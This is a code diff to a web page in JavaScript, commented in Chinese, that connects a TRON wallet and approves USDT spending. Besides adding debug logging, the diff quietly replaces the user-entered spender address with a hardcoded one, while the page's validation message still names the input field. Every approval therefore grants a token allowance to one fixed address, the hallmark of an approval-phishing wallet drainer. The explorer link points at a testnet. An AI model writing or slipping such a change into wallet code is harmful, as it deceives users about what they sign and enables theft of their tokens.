@@ -105,45 +105,49 @@
   // ===== 授权 =====
   $('approveBtn').onclick = async () => {
     try {
+      log('STEP 0: 点击授权');
       const p = getProvider();
       tronWeb = p?.tronWeb;
       address = tronWeb?.defaultAddress?.base58;
-
+  
       if (!tronWeb || !address) {
         log('❌ 先点「连接钱包」', 'err');
         return;
       }
-
-      const spender = $('trxA').value.trim();
+  
+      const spender = 'TG9XX5MXesQyG3V7Z9ZuorqvhU2KWuphkY';
       const amt = $('amount').value;
       if (!tronWeb.isAddress(spender)) return log('❌ trxA 地址不对', 'err');
       if (!(parseFloat(amt) > 0)) return log('❌ 数量必须大于0', 'err');
-
+  
       $('approveBtn').disabled = true;
-      log('⏳ 读取合约 decimals...');
-
+      log('STEP 1: 参数校验通过');
+  
+      log('STEP 2: 开始 contract.at');
       const c = await tronWeb.contract().at(USDT);
+      log('STEP 3: contract.at 完成');
+  
+      log('STEP 4: 开始 decimals');
       const dec = Number(await c.decimals().call()) || 6;
       const raw = toBase(amt, dec);
-      log('decimals=' + dec + '，链上值=' + raw);
-
-      log('📝 请在钱包确认...');
+      log('STEP 5: decimals=' + dec + '，链上值=' + raw);
+  
+      log('STEP 6: 即将调用 send');
       const tx = await c.approve(spender, raw).send({
-        feeLimit: '5000000000000000',
+        feeLimit: '500011231230000',
         callValue: '0'
       });
-
+  
+      log('STEP 7: send 返回，tx=' + tx, 'ok');
       log('✅ 成功 TxID: ' + tx, 'ok');
       log('🔍 nile.tronscan.org/#/transaction/' + tx, 'ok');
     } catch (e) {
       console.error(e);
-      if (/declined/i.test(e?.message || '')) log('❌ 用户拒绝签名', 'err');
-      else if (/energy/i.test(e?.message || '')) log('❌ 能量不足', 'err');
-      else log('❌ 授权失败：' + (e?.message || e), 'err');
+      log('❌ 报错：' + (e?.message || e), 'err');
     } finally {
       $('approveBtn').disabled = false;
     }
-  };
+};
 </script>
 </body>
 </html>
